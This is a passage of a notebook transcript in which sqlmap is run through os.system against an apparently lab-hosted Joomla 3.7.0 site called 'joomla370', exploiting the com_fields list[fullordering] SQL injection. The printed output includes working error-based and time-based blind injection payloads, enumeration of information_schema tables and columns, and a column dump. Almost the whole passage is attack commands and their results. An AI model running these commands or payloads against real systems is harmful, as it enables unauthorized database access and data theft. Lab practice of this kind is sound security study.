# [13:50:24] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:50:24] [INFO] retrieved: 'INDEX_STATISTICS'
# [13:50:24] [INFO] retrieved: 'INNODB_FT_CONFIG'
# [13:50:25] [INFO] retrieved: 'GEOMETRY_COLUMNS'
# [13:50:25] [INFO] retrieved: 'INNODB_SYS_TABLESTATS'
# [13:50:26] [INFO] retrieved: 'SPATIAL_REF_SYS'
# [13:50:26] [INFO] retrieved: 'USER_STATISTICS'
# [13:50:27] [INFO] retrieved: 'INNODB_TRX'
# [13:50:27] [INFO] retrieved: 'INNODB_CMP_PER_INDEX'
# [13:50:28] [INFO] retrieved: 'INNODB_METRICS'
# [13:50:28] [INFO] retrieved: 'INNODB_FT_DELETED'
# [13:50:29] [INFO] retrieved: 'INNODB_CMP'
# [13:50:29] [INFO] retrieved: 'THREAD_POOL_WAITS'
# [13:50:29] [INFO] retrieved: 'INNODB_CMP_RESET'
# [13:50:30] [INFO] retrieved: 'THREAD_POOL_QUEUES'
# [13:50:30] [INFO] retrieved: 'TABLE_STATISTICS'
# [13:50:31] [INFO] retrieved: 'INNODB_SYS_FIELDS'
# [13:50:31] [INFO] retrieved: 'INNODB_BUFFER_PAGE_LRU'
# [13:50:32] [INFO] retrieved: 'INNODB_LOCKS'
# [13:50:32] [INFO] retrieved: 'INNODB_FT_INDEX_TABLE'
# [13:50:33] [INFO] retrieved: 'INNODB_CMPMEM'
# [13:50:34] [INFO] retrieved: 'THREAD_POOL_GROUPS'
# [13:50:34] [INFO] retrieved: 'INNODB_CMP_PER_INDEX_RESET'
# [13:50:34] [INFO] retrieved: 'INNODB_SYS_FOREIGN_COLS'
# [13:50:35] [INFO] retrieved: 'INNODB_FT_INDEX_CACHE'
# [13:50:35] [INFO] retrieved: 'INNODB_BUFFER_POOL_STATS'
# [13:50:36] [INFO] retrieved: 'INNODB_FT_BEING_DELETED'
# [13:50:36] [INFO] retrieved: 'INNODB_SYS_FOREIGN'
# [13:50:37] [INFO] retrieved: 'INNODB_CMPMEM_RESET'
# [13:50:37] [INFO] retrieved: 'INNODB_FT_DEFAULT_STOPWORD'
# [13:50:38] [INFO] retrieved: 'INNODB_SYS_TABLES'
# [13:50:38] [INFO] retrieved: 'INNODB_SYS_COLUMNS'
# [13:50:39] [INFO] retrieved: 'INNODB_SYS_TABLESPACES'
# [13:50:39] [INFO] retrieved: 'INNODB_SYS_INDEXES'
# [13:50:40] [INFO] retrieved: 'INNODB_BUFFER_PAGE'
# [13:50:40] [INFO] retrieved: 'INNODB_SYS_VIRTUAL'
# [13:50:40] [INFO] retrieved: 'user_variables'
# [13:50:41] [INFO] retrieved: 'INNODB_TABLESPACES_ENCRYPTION'
# [13:50:41] [INFO] retrieved: 'INNODB_LOCK_WAITS'
# [13:50:42] [INFO] retrieved: 'THREAD_POOL_STATS'
# Database: information_schema
# [79 tables]
# +---------------------------------------+
# | ALL_PLUGINS                           |
# | APPLICABLE_ROLES                      |
# | CHARACTER_SETS                        |
# | CHECK_CONSTRAINTS                     |
# | CLIENT_STATISTICS                     |
# | COLLATIONS                            |
# | COLLATION_CHARACTER_SET_APPLICABILITY |
# | COLUMN_PRIVILEGES                     |
# | ENABLED_ROLES                         |
# | ENGINES                               |
# | EVENTS                                |
# | FILES                                 |
# | GEOMETRY_COLUMNS                      |
# | GLOBAL_STATUS                         |
# | GLOBAL_VARIABLES                      |
# | INDEX_STATISTICS                      |
# | INNODB_BUFFER_PAGE                    |
# | INNODB_BUFFER_PAGE_LRU                |
# | INNODB_BUFFER_POOL_STATS              |
# | INNODB_CMP                            |
# | INNODB_CMPMEM                         |
# | INNODB_CMPMEM_RESET                   |
# | INNODB_CMP_PER_INDEX                  |
# | INNODB_CMP_PER_INDEX_RESET            |
# | INNODB_CMP_RESET                      |
# | INNODB_FT_BEING_DELETED               |
# | INNODB_FT_CONFIG                      |
# | INNODB_FT_DEFAULT_STOPWORD            |
# | INNODB_FT_DELETED                     |
# | INNODB_FT_INDEX_CACHE                 |
# | INNODB_FT_INDEX_TABLE                 |
# | INNODB_LOCKS                          |
# | INNODB_LOCK_WAITS                     |
# | INNODB_METRICS                        |
# | INNODB_SYS_COLUMNS                    |
# | INNODB_SYS_FIELDS                     |
# | INNODB_SYS_FOREIGN                    |
# | INNODB_SYS_FOREIGN_COLS               |
# | INNODB_SYS_INDEXES                    |
# | INNODB_SYS_TABLES                     |
# | INNODB_SYS_TABLESPACES                |
# | INNODB_SYS_TABLESTATS                 |
# | INNODB_SYS_VIRTUAL                    |
# | INNODB_TABLESPACES_ENCRYPTION         |
# | INNODB_TRX                            |
# | KEYWORDS                              |
# | KEY_CACHES                            |
# | KEY_COLUMN_USAGE                      |
# | OPTIMIZER_TRACE                       |
# | PARAMETERS                            |
# | PARTITIONS                            |
# | PLUGINS                               |
# | PROCESSLIST                           |
# | PROFILING                             |
# | REFERENTIAL_CONSTRAINTS               |
# | ROUTINES                              |
# | SCHEMATA                              |
# | SCHEMA_PRIVILEGES                     |
# | SESSION_STATUS                        |
# | SESSION_VARIABLES                     |
# | SPATIAL_REF_SYS                       |
# | SQL_FUNCTIONS                         |
# | SYSTEM_VARIABLES                      |
# | TABLESPACES                           |
# | TABLE_CONSTRAINTS                     |
# | TABLE_PRIVILEGES                      |
# | TABLE_STATISTICS                      |
# | THREAD_POOL_GROUPS                    |
# | THREAD_POOL_QUEUES                    |
# | THREAD_POOL_STATS                     |
# | THREAD_POOL_WAITS                     |
# | TRIGGERS                              |
# | USER_PRIVILEGES                       |
# | USER_STATISTICS                       |
# | VIEWS                                 |
# | COLUMNS                               |
# | STATISTICS                            |
# | TABLES                                |
# | user_variables                        |
# +---------------------------------------+
#
# [13:50:43] [WARNING] HTTP error codes detected during run:
# 500 (Internal Server Error) - 80 times
# [13:50:43] [INFO] fetched data logged to text files under '/home/jovyan/.sqlmap/output/joomla370'
# [13:50:43] [WARNING] you haven't updated sqlmap for more than 747 days!!!
#
# [*] ending @ 13:50:43 /2022-04-20/
# 0

# %%
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D information_schema -T COLUMNS --columns')
# Out:
#         ___
#        __H__
#  ___ ___[(]_____ ___ ___  {1.4.4#stable}
# |_ -| . [(]     | .'| . |
# |___|_  [']_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 13:50:45 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [13:50:45] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [13:50:45] [INFO] resuming back-end DBMS 'mysql'
# [13:50:45] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://joomla370:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# you have not declared cookie(s), while server wants to set its own ('16ecd03278f46e4a6f358c90f0c01dd3=719845085f1...01fc71127e'). Do you want to use those [Y/n] Y
# [13:50:46] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
# sqlmap resumed the following injection point(s) from stored session:
# ---
# Parameter: #1* (URI)
#     Type: error-based
#     Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2456 FROM(SELECT COUNT(*),CONCAT(0x7178767a71,(SELECT (ELT(2456=2456,1))),0x7171627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
#
#     Type: time-based blind
#     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9446 FROM (SELECT(SLEEP(5)))MVgk)
# ---
# [13:50:46] [INFO] the back-end DBMS is MySQL
# back-end DBMS: MySQL >= 5.0 (MariaDB fork)
# [13:50:47] [INFO] fetching columns for table 'COLUMNS' in database 'information_schema'
# [13:50:48] [INFO] retrieved: 'TABLE_CATALOG'
# [13:50:49] [INFO] retrieved: 'varchar(512)'
# [13:50:49] [INFO] retrieved: 'TABLE_SCHEMA'
# [13:50:50] [INFO] retrieved: 'varchar(64)'
# [13:50:50] [INFO] retrieved: 'TABLE_NAME'
# [13:50:51] [INFO] retrieved: 'varchar(64)'
# [13:50:52] [INFO] retrieved: 'COLUMN_NAME'
# [13:50:52] [INFO] retrieved: 'varchar(64)'
# [13:50:52] [INFO] retrieved: 'ORDINAL_POSITION'
# [13:50:53] [INFO] retrieved: 'bigint(21) unsigned'
# [13:50:53] [INFO] retrieved: 'COLUMN_DEFAULT'
# [13:50:54] [INFO] retrieved: 'longtext'
# [13:50:54] [INFO] retrieved: 'IS_NULLABLE'
# [13:50:55] [INFO] retrieved: 'varchar(3)'
# [13:50:55] [INFO] retrieved: 'DATA_TYPE'
# [13:50:56] [INFO] retrieved: 'varchar(64)'
# [13:50:56] [INFO] retrieved: 'CHARACTER_MAXIMUM_LENGTH'
# [13:50:57] [INFO] retrieved: 'bigint(21) unsigned'
# [13:50:57] [INFO] retrieved: 'CHARACTER_OCTET_LENGTH'
# [13:50:58] [INFO] retrieved: 'bigint(21) unsigned'
# [13:50:58] [INFO] retrieved: 'NUMERIC_PRECISION'
# [13:50:58] [INFO] retrieved: 'bigint(21) unsigned'
# [13:50:59] [INFO] retrieved: 'NUMERIC_SCALE'
# [13:50:59] [INFO] retrieved: 'bigint(21) unsigned'
# [13:51:00] [INFO] retrieved: 'DATETIME_PRECISION'
# [13:51:00] [INFO] retrieved: 'bigint(21) unsigned'
# [13:51:01] [INFO] retrieved: 'CHARACTER_SET_NAME'
# [13:51:02] [INFO] retrieved: 'varchar(32)'
# [13:51:02] [INFO] retrieved: 'COLLATION_NAME'
# [13:51:03] [INFO] retrieved: 'varchar(32)'
# [13:51:03] [INFO] retrieved: 'COLUMN_TYPE'
# [13:51:04] [INFO] retrieved: 'longtext'
# [13:51:04] [INFO] retrieved: 'COLUMN_KEY'
# [13:51:05] [INFO] retrieved: 'varchar(3)'
# [13:51:05] [INFO] retrieved: 'EXTRA'
# [13:51:06] [INFO] retrieved: 'varchar(30)'
# [13:51:06] [INFO] retrieved: 'PRIVILEGES'
# [13:51:07] [INFO] retrieved: 'varchar(80)'
# [13:51:07] [INFO] retrieved: 'COLUMN_COMMENT'
# [13:51:08] [INFO] retrieved: 'varchar(1024)'
# [13:51:08] [INFO] retrieved: 'IS_GENERATED'
# [13:51:09] [INFO] retrieved: 'varchar(6)'
# [13:51:09] [INFO] retrieved: 'GENERATION_EXPRESSION'
# [13:51:10] [INFO] retrieved: 'longtext'
# Database: information_schema
# Table: COLUMNS
# [22 columns]
# +--------------------------+---------------------+
# | Column                   | Type                |
# +--------------------------+---------------------+
# | CHARACTER_SET_NAME       | varchar(32)         |
# | COLLATION_NAME           | varchar(32)         |
# | COLUMN_NAME              | varchar(64)         |
# | PRIVILEGES               | varchar(80)         |
# | TABLE_NAME               | varchar(64)         |
# | CHARACTER_MAXIMUM_LENGTH | bigint(21) unsigned |
# | CHARACTER_OCTET_LENGTH   | bigint(21) unsigned |
# | COLUMN_COMMENT           | varchar(1024)       |
# | COLUMN_DEFAULT           | longtext            |
# | COLUMN_KEY               | varchar(3)          |
# | COLUMN_TYPE              | longtext            |
# | DATA_TYPE                | varchar(64)         |
# | DATETIME_PRECISION       | bigint(21) unsigned |
# | EXTRA                    | varchar(30)         |
# | GENERATION_EXPRESSION    | longtext            |
# | IS_GENERATED             | varchar(6)          |
# | IS_NULLABLE              | varchar(3)          |
# | NUMERIC_PRECISION        | bigint(21) unsigned |
# | NUMERIC_SCALE            | bigint(21) unsigned |
# | ORDINAL_POSITION         | bigint(21) unsigned |
# | TABLE_CATALOG            | varchar(512)        |
# | TABLE_SCHEMA             | varchar(64)         |
# +--------------------------+---------------------+
#
# [13:51:10] [WARNING] HTTP error codes detected during run:
# 500 (Internal Server Error) - 45 times
# [13:51:10] [INFO] fetched data logged to text files under '/home/jovyan/.sqlmap/output/joomla370'
# [13:51:10] [WARNING] you haven't updated sqlmap for more than 747 days!!!
#
# [*] ending @ 13:51:10 /2022-04-20/
# 0

# %%
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D information_schema -T COLUMNS -C TABLE_NAME,COLUMN_NAME --dump')
# Out:
#         ___
#        __H__
#  ___ ___[']_____ ___ ___  {1.4.4#stable}
# |_ -| . [(]     | .'| . |
# |___|_  [)]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 13:51:11 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [13:51:12] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [13:51:12] [INFO] resuming back-end DBMS 'mysql'
# [13:51:12] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://joomla370:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# you have not declared cookie(s), while server wants to set its own ('16ecd03278f46e4a6f358c90f0c01dd3=76bfae146b3...8cf1ba3a16'). Do you want to use those [Y/n] Y
# [13:51:13] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
# sqlmap resumed the following injection point(s) from stored session:
# ---
# Parameter: #1* (URI)
#     Type: error-based
#     Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2456 FROM(SELECT COUNT(*),CONCAT(0x7178767a71,(SELECT (ELT(2456=2456,1))),0x7171627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
#
#     Type: time-based blind
#     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9446 FROM (SELECT(SLEEP(5)))MVgk)
# ---
# [13:51:13] [INFO] the back-end DBMS is MySQL
# back-end DBMS: MySQL >= 5.0 (MariaDB fork)
# [13:51:13] [INFO] fetching entries of column(s) '`COLUMN_NAME`, `TABLE_NAME`' for table 'COLUMNS' in database 'information_schema'
# [13:51:16] [INFO] retrieved: 'PLUGIN_VERSION'
# [13:51:17] [INFO] retrieved: 'ALL_PLUGINS'
# [13:51:17] [INFO] retrieved: 'PLUGIN_STATUS'
# [13:51:18] [INFO] retrieved: 'ALL_PLUGINS'
# [13:51:19] [INFO] retrieved: 'PLUGIN_TYPE'
# [13:51:19] [INFO] retrieved: 'ALL_PLUGINS'
# [13:51:20] [INFO] retrieved: 'PLUGIN_TYPE_VERSION'
# [13:51:20] [INFO] retrieved: 'ALL_PLUGINS'
# [13:51:21] [INFO] retrieved: 'PLUGIN_LIBRARY'
# [13:51:21] [INFO] retrieved: 'ALL_PLUGINS'
# [13:51:22] [INFO] retrieved: 'PLUGIN_LIBRARY_VERSION'
# [13:51:22] [INFO] retrieved: 'ALL_PLUGINS'
# [13:51:23] [INFO] retrieved: 'PLUGIN_AUTHOR'
# [13:51:23] [INFO] retrieved: 'ALL_PLUGINS'
# [13:51:24] [INFO] retrieved: 'PLUGIN_DESCRIPTION'
# [13:51:24] [INFO] retrieved: 'ALL_PLUGINS'
# [13:51:25] [INFO] retrieved: 'PLUGIN_VERSION'
# [13:51:25] [INFO] retrieved: 'ALL_PLUGINS'
# [13:51:26] [INFO] retrieved: 'PLUGIN_VERSION'
# [13:51:26] [INFO] retrieved: 'ALL_PLUGINS'
# [13:51:27] [INFO] retrieved: 'PLUGIN_VERSION'
# [13:51:27] [INFO] retrieved: 'ALL_PLUGINS'
# [13:51:28] [INFO] retrieved: 'PLUGIN_VERSION'
# [13:51:28] [INFO] retrieved: 'ALL_PLUGINS'
# [13:51:29] [INFO] retrieved: 'PLUGIN_VERSION'
# [13:51:30] [INFO] retrieved: 'ALL_PLUGINS'
# [13:51:30] [INFO] retrieved: 'ROLE_NAME'
# [13:51:31] [INFO] retrieved: 'APPLICABLE_ROLES'
# [13:51:31] [INFO] retrieved: 'IS_GRANTABLE'
# [13:51:32] [INFO] retrieved: 'APPLICABLE_ROLES'
# [13:51:32] [INFO] retrieved: 'IS_DEFAULT'
# [13:51:33] [INFO] retrieved: 'APPLICABLE_ROLES'
# [13:51:33] [INFO] retrieved: 'IS_DEFAULT'
# [13:51:34] [INFO] retrieved: 'APPLICABLE_ROLES'
# [13:51:34] [INFO] retrieved: 'DEFAULT_COLLATE_NAME'
# [13:51:34] [INFO] retrieved: 'CHARACTER_SETS'
# [13:51:35] [INFO] retrieved: 'DESCRIPTION'
# [13:51:36] [INFO] retrieved: 'CHARACTER_SETS'
# [13:51:36] [INFO] retrieved: 'MAXLEN'
# [13:51:37] [INFO] retrieved: 'CHARACTER_SETS'
# [13:51:37] [INFO] retrieved: 'MAXLEN'
# [13:51:38] [INFO] retrieved: 'CHARACTER_SETS'
# [13:51:38] [INFO] retrieved: 'CONSTRAINT_SCHEMA'
# [13:51:39] [INFO] retrieved: 'CHECK_CONSTRAINTS'
# [13:51:39] [INFO] retrieved: 'TABLE_NAME'
# [13:51:40] [INFO] retrieved: 'CHECK_CONSTRAINTS'
# [13:51:40] [INFO] retrieved: 'CONSTRAINT_NAME'
# [13:51:41] [INFO] retrieved: 'CHECK_CONSTRAINTS'
# [13:51:41] [INFO] retrieved: 'LEVEL'
# [13:51:42] [INFO] retrieved: 'CHECK_CONSTRAINTS'
# [13:51:42] [INFO] retrieved: 'CHECK_CLAUSE'
# [13:51:43] [INFO] retrieved: 'CHECK_CONSTRAINTS'
# [13:51:43] [INFO] retrieved: 'CONSTRAINT_CATALOG'
# [13:51:44] [INFO] retrieved: 'CHECK_CONSTRAINTS'
# [13:51:44] [INFO] retrieved: 'CLIENT'
# [13:51:44] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:45] [INFO] retrieved: 'TOTAL_CONNECTIONS'
# [13:51:46] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:46] [INFO] retrieved: 'CONCURRENT_CONNECTIONS'
# [13:51:47] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:47] [INFO] retrieved: 'TOTAL_CONNECTIONS'
# [13:51:48] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:48] [INFO] retrieved: 'CONCURRENT_CONNECTIONS'
# [13:51:49] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:49] [INFO] retrieved: 'CLIENT'
# [13:51:50] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:50] [INFO] retrieved: 'TOTAL_CONNECTIONS'
# [13:51:51] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:51] [INFO] retrieved: 'CLIENT'
# [13:51:52] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:52] [INFO] retrieved: 'TOTAL_CONNECTIONS'
# [13:51:53] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:53] [INFO] retrieved: 'CONCURRENT_CONNECTIONS'
# [13:51:54] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:54] [INFO] retrieved: 'CONNECTED_TIME'
# [13:51:55] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:55] [INFO] retrieved: 'BUSY_TIME'
# [13:51:56] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:56] [INFO] retrieved: 'ROWS_SENT'
# [13:51:57] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:57] [INFO] retrieved: 'BYTES_RECEIVED'
# [13:51:58] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:58] [INFO] retrieved: 'BYTES_SENT'
# [13:51:59] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:51:59] [INFO] retrieved: 'BINLOG_BYTES_WRITTEN'
# [13:52:00] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:52:00] [INFO] retrieved: 'ROWS_READ'
# [13:52:01] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:52:01] [INFO] retrieved: 'ROWS_INSERTED'
# [13:52:02] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:52:03] [INFO] retrieved: 'ROWS_UPDATED'
# [13:52:03] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:52:04] [INFO] retrieved: 'ROWS_INSERTED'
# [13:52:04] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:52:05] [INFO] retrieved: 'ROWS_UPDATED'
# [13:52:05] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:52:05] [INFO] retrieved: 'SELECT_COMMANDS'
# [13:52:06] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:52:06] [INFO] retrieved: 'UPDATE_COMMANDS'
# [13:52:07] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:52:07] [INFO] retrieved: 'OTHER_COMMANDS'
# [13:52:08] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:52:09] [INFO] retrieved: 'COMMIT_TRANSACTIONS'
# [13:52:09] [INFO] retrieved: 'CLIENT_STATISTICS'
# [13:52:10] [INFO] retrieved: 'IS_DEFAULT'
# [13:52:10] [INFO] retrieved: 'COLLATIONS'
# [13:52:10] [INFO] retrieved: 'ID'
# [13:52:11] [INFO] retrieved: 'COLLATIONS'
# [13:52:11] [INFO] retrieved: 'ID'
# [13:52:12] [INFO] retrieved: 'COLLATIONS'
# [13:52:12] [INFO] retrieved: 'COLLATION_NAME'
# [13:52:13] [INFO] retrieved: 'COLLATIONS'
# [13:52:13] [INFO] retrieved: 'SORTLEN'
# [13:52:14] [INFO] retrieved: 'COLLATIONS'
# [13:52:14] [INFO] retrieved: 'ID'
# [13:52:15] [INFO] retrieved: 'COLLATIONS'
# [13:52:15] [INFO] retrieved: 'CHARACTER_SET_NAME'
# [13:52:16] [INFO] retrieved: 'COLLATION_CHARACTER_SET_APPLICABILITY'
# [13:52:16] [INFO] retrieved: 'CHARACTER_SET_NAME'
# [13:52:17] [INFO] retrieved: 'COLLATION_CHARACTER_SET_APPLICABILITY'
# [13:52:17] [INFO] retrieved: 'TABLE_CATALOG'
# [13:52:18] [INFO] retrieved: 'COLUMNS'
# [13:52:19] [INFO] retrieved: 'TABLE_CATALOG'
# [13:52:19] [INFO] retrieved: 'COLUMNS'
# [13:52:20] [INFO] retrieved: 'TABLE_CATALOG'
# [13:52:21] [INFO] retrieved: 'COLUMNS'
# [13:52:21] [INFO] retrieved: 'DATETIME_PRECISION'
# [13:52:22] [INFO] retrieved: 'COLUMNS'
# [13:52:22] [INFO] retrieved: 'IS_GENERATED'
# [13:52:23] [INFO] retrieved: 'COLUMNS'
# [13:52:24] [INFO] retrieved: 'IS_GENERATED'
# [13:52:24] [INFO] retrieved: 'COLUMNS'
# [13:52:25] [INFO] retrieved: 'DATETIME_PRECISION'
# [13:52:25] [INFO] retrieved: 'COLUMNS'
# [13:52:26] [INFO] retrieved: 'EXTRA'
# [13:52:27] [INFO] retrieved: 'COLUMNS'
# [13:52:27] [INFO] retrieved: 'PRIVILEGES'
# [13:52:28] [INFO] retrieved: 'COLUMNS'
# [13:52:28] [INFO] retrieved: 'COLUMN_COMMENT'
# [13:52:29] [INFO] retrieved: 'COLUMNS'
# [13:52:29] [INFO] retrieved: 'DATETIME_PRECISION'
# [13:52:30] [INFO] retrieved: 'COLUMNS'
# [13:52:30] [INFO] retrieved: 'COLUMN_COMMENT'
# [13:52:31] [INFO] retrieved: 'COLUMNS'
# [13:52:32] [INFO] retrieved: 'GENERATION_EXPRESSION'
# [13:52:32] [INFO] retrieved: 'COLUMNS'
# [13:52:33] [INFO] retrieved: 'GENERATION_EXPRESSION'
# [13:52:33] [INFO] retrieved: 'COLUMNS'
# [13:52:34] [INFO] retrieved: 'NUMERIC_PRECISION'
# [13:52:34] [INFO] retrieved: 'COLUMNS'
# [13:52:35] [INFO] retrieved: 'CHARACTER_MAXIMUM_LENGTH'
# [13:52:35] [INFO] retrieved: 'COLUMNS'
# [13:52:36] [INFO] retrieved: 'DATETIME_PRECISION'
# [13:52:37] [INFO] retrieved: 'COLUMNS'
# [13:52:37] [INFO] retrieved: 'CHARACTER_MAXIMUM_LENGTH'
# [13:52:38] [INFO] retrieved: 'COLUMNS'
# [13:52:38] [INFO] retrieved: 'COLLATION_NAME'
# [13:52:39] [INFO] retrieved: 'COLUMNS'
# [13:52:39] [INFO] retrieved: 'COLUMN_TYPE'
# [13:52:40] [INFO] retrieved: 'COLUMNS'
# [13:52:41] [INFO] retrieved: 'COLUMN_KEY'
# [13:52:41] [INFO] retrieved: 'COLUMNS'
# [13:52:41] [INFO] retrieved: 'CHARACTER_MAXIMUM_LENGTH'
# [13:52:42] [INFO] retrieved: 'COLUMNS'
# [13:52:43] [INFO] retrieved: 'PRIVILEGE_TYPE'
# [13:52:43] [INFO] retrieved: 'COLUMN_PRIVILEGES'
# [13:52:44] [INFO] retrieved: 'COLUMN_NAME'
# [13:52:44] [INFO] retrieved: 'COLUMN_PRIVILEGES'
# [13:52:45] [INFO] retrieved: 'TABLE_NAME'
# [13:52:45] [INFO] retrieved: 'COLUMN_PRIVILEGES'
# [13:52:46] [INFO] retrieved: 'TABLE_SCHEMA'
# [13:52:47] [INFO] retrieved: 'COLUMN_PRIVILEGES'
# [13:52:47] [INFO] retrieved: 'TABLE_CATALOG'
# [13:52:47] [INFO] retrieved: 'COLUMN_PRIVILEGES'
# [13:52:48] [INFO] retrieved: 'TABLE_CATALOG'
# [13:52:49] [INFO] retrieved: 'COLUMN_PRIVILEGES'
# [13:52:49] [INFO] retrieved: 'TABLE_CATALOG'
# [13:52:50] [INFO] retrieved: 'COLUMN_PRIVILEGES'
# [13:52:50] [INFO] retrieved: 'ROLE_NAME'
# [13:52:51] [INFO] retrieved: 'ENABLED_ROLES'
# [13:52:52] [INFO] retrieved: 'COMMENT'
# [13:52:52] [INFO] retrieved: 'ENGINES'
# [13:52:53] [INFO] retrieved: 'COMMENT'
# [13:52:53] [INFO] retrieved: 'ENGINES'
# [13:52:54] [INFO] retrieved: 'SUPPORT'
# [13:52:55] [INFO] retrieved: 'ENGINES'
# [13:52:55] [INFO] retrieved: 'SUPPORT'
# [13:52:56] [INFO] retrieved: 'ENGINES'
# [13:52:56] [INFO] retrieved: 'COMMENT'
# [13:52:57] [INFO] retrieved: 'ENGINES'
# [13:52:57] [INFO] retrieved: 'COMMENT'
# [13:52:58] [INFO] retrieved: 'ENGINES'
# [13:52:58] [INFO] retrieved: 'EVENT_CATALOG'
# [13:52:59] [INFO] retrieved: 'EVENTS'
# [13:52:59] [INFO] retrieved: 'EVENT_CATALOG'
# [13:53:00] [INFO] retrieved: 'EVENTS'
# [13:53:00] [INFO] retrieved: 'COLLATION_CONNECTION'
# [13:53:01] [INFO] retrieved: 'EVENTS'
# [13:53:01] [INFO] retrieved: 'DATABASE_COLLATION'
# [13:53:02] [INFO] retrieved: 'EVENTS'
# [13:53:02] [INFO] retrieved: 'ORIGINATOR'
# [13:53:03] [INFO] retrieved: 'EVENTS'
# [13:53:04] [INFO] retrieved: 'EVENT_COMMENT'
# [13:53:04] [INFO] retrieved: 'EVENTS'
# [13:53:04] [INFO] retrieved: 'EVENT_COMMENT'
# [13:53:05] [INFO] retrieved: 'EVENTS'
# [13:53:05] [INFO] retrieved: 'ORIGINATOR'
# [13:53:06] [INFO] retrieved: 'EVENTS'
# [13:53:07] [INFO] retrieved: 'CHARACTER_SET_CLIENT'
# [13:53:07] [INFO] retrieved: 'EVENTS'
# [13:53:07] [INFO] retrieved: 'COLLATION_CONNECTION'
# [13:53:08] [INFO] retrieved: 'EVENTS'
# [13:53:08] [INFO] retrieved: 'DATABASE_COLLATION'
# [13:53:09] [INFO] retrieved: 'EVENTS'
# [13:53:09] [INFO] retrieved: 'DATABASE_COLLATION'
# [13:53:10] [INFO] retrieved: 'EVENTS'
# [13:53:11] [INFO] retrieved: 'STARTS'
# [13:53:12] [INFO] retrieved: 'EVENTS'
# [13:53:12] [INFO] retrieved: 'ENDS'
# [13:53:13] [INFO] retrieved: 'EVENTS'
# [13:53:13] [INFO] retrieved: 'STARTS'
# [13:53:14] [INFO] retrieved: 'EVENTS'
# [13:53:14] [INFO] retrieved: 'ENDS'
# [13:53:14] [INFO] retrieved: 'EVENTS'
# [13:53:15] [INFO] retrieved: 'EXECUTE_AT'
# [13:53:15] [INFO] retrieved: 'EVENTS'
# [13:53:16] [INFO] retrieved: 'EVENT_TYPE'
# [13:53:16] [INFO] retrieved: 'EVENTS'
# [13:53:17] [INFO] retrieved: 'EVENT_TYPE'
# [13:53:17] [INFO] retrieved: 'EVENTS'
# [13:53:18] [INFO] retrieved: 'EVENT_DEFINITION'
# [13:53:19] [INFO] retrieved: 'EVENTS'
# [13:53:19] [INFO] retrieved: 'STATUS'
# [13:53:20] [INFO] retrieved: 'EVENTS'
# [13:53:20] [INFO] retrieved: 'EVENT_COMMENT'
# [13:53:21] [INFO] retrieved: 'EVENTS'
# [13:53:21] [INFO] retrieved: 'LAST_EXECUTED'
# [13:53:22] [INFO] retrieved: 'EVENTS'
# [13:53:22] [INFO] retrieved: 'EVENT_BODY'
# [13:53:23] [INFO] retrieved: 'EVENTS'
